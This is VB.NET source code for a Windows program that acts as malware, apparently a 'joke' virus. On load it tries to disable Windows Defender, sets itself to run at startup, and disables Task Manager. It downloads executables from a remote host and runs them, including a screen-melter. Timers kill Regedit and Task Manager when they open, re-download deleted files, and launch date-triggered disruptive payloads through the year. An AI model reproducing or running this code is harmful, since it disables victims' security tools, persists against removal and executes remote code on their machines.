﻿Imports System
Imports Microsoft.Win32
Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Security.AccessControl
Imports System.Management


Public Class Form1
    Dim working As Boolean = True
    Dim RegistryKey As Object
    Dim admin As Boolean = True
    Dim download1 As Boolean = False
    Dim download2 As Boolean = False
    Dim download3 As Boolean = False
    Dim download4 As Boolean = False
    Dim working4 As Boolean = False

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/Hoax.Win32.BadJoke.BlastBtn.a.exe
        HideTaskManager()

        Try
            Dim scope As New ManagementScope("\\.\ROOT\SecurityCenter2")
            scope.Connect()

            Dim query As New ObjectQuery("SELECT * FROM AntivirusProduct")
            Dim searcher As New ManagementObjectSearcher(scope, query)

            For Each instance As ManagementObject In searcher.Get()
                If instance("displayName").ToString().Contains("Windows Defender") Then
                    instance.InvokeMethod("SetEnable", New Object() {False})
                End If
            Next
        Catch ex As Exception

        End Try

        Dim path As String = "C:\Users\" & SystemInformation.UserName & "\path.yuki"

        Dim fs As FileStream = File.Create(path)

        ' Add text to the file.
        Dim info As Byte() = New UTF8Encoding(True).GetBytes(Application.ExecutablePath)
        fs.Write(info, 0, info.Length)
        fs.Close()



        RegistryKey = CreateObject("WScript.Shell")
        Try
            download1 = True
            My.Computer.Network.DownloadFile(
         "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll",
        "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll")

        Catch ex As Exception

        End Try

        Try
            download2 = True
            My.Computer.Network.DownloadFile(
               "https://incomparable-cascaron-802b94.netlify.app/Interop.WMPLib.dll",
              "C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll")

        Catch ex As Exception

        End Try

        Try
            download4 = True
            My.Computer.Network.DownloadFile(
               "https://incomparable-cascaron-802b94.netlify.app/Hoax.Win32.BadJoke.BlastBtn.a.exe",
              "C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")

        Catch ex As Exception

        End Try


        Try
            download3 = True
            My.Computer.Network.DownloadFile(
              "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
             "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")

        Catch ex As Exception

        End Try


        Try
            download3 = True
            My.Computer.Network.DownloadFile(
              "https://incomparable-cascaron-802b94.netlify.app/monitoring-service.exe",
             "C:\Users\" & SystemInformation.UserName & "\Wncujekce893hxc8y3hnsp3u809ef3y7dsgfre45t4gr.exe")

        Catch ex As Exception

        End Try



        Try 'remove... My.Computer.Registry.LocalMachine.OpenSubKey("S
            'OFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
            Dim fileq As System.IO.StreamWriter

            fileq = My.Computer.FileSystem.OpenTextFileWriter("C:\YFShshfgsd.yuki", True)
            fileq.WriteLine("just a temp file...")
            fileq.Close()
            Threading.Thread.Sleep(100) ' 500 milliseconds = 0.5 seconds
            File.Delete("C:\YFShshfgsd.yuki")

            RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\kbdhid\Parameters\CrashOnCtrlScroll", 1, "REG_DWORD")
            Try
                My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
            Catch ex As Exception

            End Try
            Threading.Thread.Sleep(100) ' 500 milliseconds = 0.5 seconds
            If My.Computer.FileSystem.FileExists("RESET.yuki") Then
                RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")
            Else
                My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
                RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
            End If

        Catch ex As Exception

            admin = False
            If ex.ToString.Contains("denied") Then
                If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
                    If Not My.Computer.FileSystem.FileExists("yuki3.exe.config") Then
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\Wncujekce893hxc8y3hnsp3u809ef3y7dsgfre45t4gr.exe")
                    End If
                    CehckforbadPross.Start()
                Else

                    runasadmin()
                    Me.Close()
                End If

            End If
        End Try


        '  Me.WindowState = Me.WindowState.Minimized
        If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
            Dim today = Date.Today
            Dim day = today.Day
            Dim month = today.Month
            If My.Settings.working = True Then
                If day = 1 AndAlso month = 1 Then
                    NewYears.Show()
                End If
                If day = 1 AndAlso month = 2 Then
                    Try
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
                    Catch ex As Exception
                        MsgBox(ex.ToString, 0 + 16, "ERROR")
                    End Try
                End If
                If day = 10 AndAlso month = 1 Then
                    MsgBox("Your computer is still messed up (:")
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 1 AndAlso month = 3 Then
                    ur_pc_is_gone_lmao.Show()
                End If

                If day = 1 AndAlso month = 4 Then

                    Timer1.Start()
                End If
                If day = 1 AndAlso month = 5 Then
                    Process.Start("https://youareanidiot.cc/")
                End If
                If day = 1 AndAlso month = 6 Then
                    Timer2.Start()
                End If
                If day = 1 AndAlso month = 7 Then
                    hahahahaerror.Show()

                End If
                If month = 8 Then
                    '   creepy_Patrick_Star.Show()
                    Timer3.Start()
                End If
                If day = 12 AndAlso month = 2 Then
                    Form2.Show()
                End If
                If month = 9 Then

                    Process.Start("https://youtu.be/dQw4w9WgXcQ")
                    rickrolled.Show()
                End If
                If day = 1 AndAlso month = 10 Then

                    MsgBox("No computer today go outsie to play", 0 + 64, "touchgrass")
                    Timer4.Start()
                End If
                If day = 1 AndAlso month = 11 Then 'https://www.fittea.com/
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 5 AndAlso month = 11 Then
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 8 AndAlso month = 11 Then '
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 11 AndAlso month = 11 Then '
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 17 AndAlso month = 11 Then '
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 20 AndAlso month = 11 Then '
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 22 AndAlso month = 11 Then '
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 1 AndAlso month = 12 Then
                    My.Settings.working = False
                    Try
                        My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki")
                    Catch ex As Exception
                        MsgBox(ex.ToString, 0 + 16, "error")
                    End Try

                    '  My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
                    ' RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")
                    Yuki_credits.Show()

                End If
                Try
                    RegistryKey = CreateObject("WScript.Shell")
                    RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
                Catch ex As Exception

                End Try
            End If




        End If


        If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
        Else
            If admin = True Then
                MsgBox("This program is incompatible with your current Windows installation.", 0 + 16, "incompatible")
                Dim file2 As System.IO.StreamWriter
                file2 = My.Computer.FileSystem.OpenTextFileWriter("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki", True)
                file2.WriteLine("true")
                file2.Close()
                ' Set up the file path and permissions.
                Dim filePath As String = "C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki"
            End If

        End If


        Try
            'Process.Start("C:\Users\" & SystemInformation.UserName & "\monitoring service1.exe")
            working4 = True
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Using client = New WebClient()

                '  Using stream = client.OpenRead("http://www.google.com") server overloaded

            End Using
            Try
                    My.Computer.Network.DownloadFile(
            "https://incomparable-cascaron-802b94.netlify.app/346tr8Ge6.wav",
           "C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav")
                Catch ex As Exception

                End Try

                My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav", AudioPlayMode.BackgroundLoop)
                Timer1.Stop()
            'End Using
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Try
            Using client = New WebClient()
                '  Using stream = client.OpenRead("http://www.google.com")

            End Using
                Try
                    My.Computer.Network.DownloadFile(
            "https://incomparable-cascaron-802b94.netlify.app/screen-melter.exe",
           "C:\Users\" & SystemInformation.UserName & "\screen-melter.exe")
                Catch ex As Exception

                End Try


                Process.Start("C:\Users\" & SystemInformation.UserName & "\screen-melter.exe")
                Timer2.Stop()
            ' End Using
        Catch

        End Try
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Try
            Using client = New WebClient()
                '   Using stream = client.OpenRead("http://www.google.com")

            End Using
                Try
                My.Computer.Network.DownloadFile(
            "https://incomparable-cascaron-802b94.netlify.app/whatthefuckimout.wav",
           "C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav")
            Catch ex As Exception

                End Try
                creepy_Patrick_Star.Show()

            My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav", AudioPlayMode.BackgroundLoop)
            Timer2.Stop()
            ' End Using
        Catch

        End Try
    End Sub
    Dim working1 As Boolean = False
    Private Sub CehckforbadPross_Tick(sender As Object, e As EventArgs) Handles CehckforbadPross.Tick

        ' My.Computer.Network.DownloadFile(


        Dim p() As Process



        p = Process.GetProcessesByName("Regedit")
        If p.Count > 0 Then
            If working1 = False Then
                working1 = True

                Try
                    Process.GetProcessesByName("Regedit")(0).Kill()
                Catch ex As Exception

                End Try
                Try
                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                Catch ex As Exception

                End Try
                working1 = False
            End If


        Else

            ' Process is not running
        End If



        p = Process.GetProcessesByName("Taskmgr")
        If p.Count > 0 Then
            If working1 = False Then
                working1 = True

                Try
                    Process.GetProcessesByName("Taskmgr")(0).Kill()
                Catch ex As Exception

                End Try
                Try
                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                Catch ex As Exception

                End Try
                working1 = False
            End If


        Else

            ' Process is not running
        End If


    End Sub

    Private Sub DateTimePicker1_ValueChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        '
        Try
            Using client = New WebClient()
                '  Using stream = client.OpenRead("http://www.google.com")

            End Using
            Try
                My.Computer.Network.DownloadFile(
        "https://incomparable-cascaron-802b94.netlify.app/note.txt",
       "C:\Users\" & SystemInformation.UserName & "\note.txt")
            Catch ex As Exception

            End Try


            Process.Start("C:\Users\" & SystemInformation.UserName & "\note.txt")
            Timer4.Stop()
            ' End Using
        Catch

        End Try
    End Sub

    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
        Process.Start("https://www.fittea.com/")
    End Sub

    Private Sub CheckForBadFiles_Tick(sender As Object, e As EventArgs) Handles CheckForBadFiles.Tick

        Dim fileReader As String
        fileReader = "oh ur dead"
        Try
            fileReader = My.Computer.FileSystem.ReadAllText("C:\Users\" & SystemInformation.UserName & "\path.yuki")
        Catch ex As Exception

        End Try

        If Not fileReader = Application.ExecutablePath Then
            Try
                Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
            Catch ex As Exception

            End Try
            Try
                Try
                    My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\path.yuki")
                Catch ex As Exception

                End Try
                Dim path As String = "C:\Users\" & SystemInformation.UserName & "\path.yuki"
                Dim fs As FileStream = File.Create(path)
                ' Add text to the file.
                Dim info As Byte() = New UTF8Encoding(True).GetBytes(Application.ExecutablePath)
                fs.Write(info, 0, info.Length)
                fs.Close()
            Catch ex As Exception

            End Try
        End If
        If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll") Then
        Else
            If download1 = True Then
                Try
                    My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll",
   "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll")
                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                Catch ex As Exception

                End Try

            End If
        End If

        If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe") Then
        Else
            If download1 = True Then
                Try
                    My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/Yuki3.Administrator.exe",
   "C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")
                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                Catch ex As Exception

                End Try

            End If
        End If

        If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll") Then
        Else
            If download2 = True Then
                Try
                    My.Computer.Network.DownloadFile(
               "https://incomparable-cascaron-802b94.netlify.app/Interop.WMPLib.dll",
              "C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll")
                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                Catch ex As Exception

                End Try

            End If
        End If

        If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe") Then
        Else
            If download3 = True Then
                Try
                    My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
            "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                Catch ex As Exception

                End Try

            End If
        End If
    End Sub

    Private Sub Timer6_Tick(sender As Object, e As EventArgs) Handles Timer6.Tick

    End Sub

    Private Sub Timer7_Tick(sender As Object, e As EventArgs) Handles Timer7.Tick
        Try
            Dim scope As New ManagementScope("\\.\ROOT\SecurityCenter2")
            scope.Connect()

            Dim query As New ObjectQuery("SELECT * FROM AntivirusProduct")
            Dim searcher As New ManagementObjectSearcher(scope, query)

            For Each instance As ManagementObject In searcher.Get()
                If instance("displayName").ToString().Contains("Windows Defender") Then
                    instance.InvokeMethod("SetEnable", New Object() {False})
                End If
            Next
        Catch ex As Exception

        End Try
    End Sub

    Private Sub errorrow_Tick(sender As Object, e As EventArgs) Handles errorrow.Tick

    End Sub

    Public Declare Function ShowWindow Lib "user32" (ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean

    Public Const SW_HIDE As Integer = 0
    Public Const SW_SHOW As Integer = 5

    Sub HideTaskManager()
        Dim proc As Process = Process.GetCurrentProcess()
        ShowWindow(proc.MainWindowHandle, SW_HIDE)
    End Sub

    Sub ShowTaskManager()
        Dim proc As Process = Process.GetCurrentProcess()
        ShowWindow(proc.MainWindowHandle, SW_SHOW)
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        ShowTaskManager()
    End Sub
    Function runasadmin()
        Try
            My.Computer.Network.DownloadFile(
          "https://incomparable-cascaron-802b94.netlify.app/Yuki3.Administrator.exe",
         "C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")

        Catch ex As Exception

        End Try
        Try
            Process.Start("C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")
        Catch ex As Exception

        End Try
    End Function
End Class
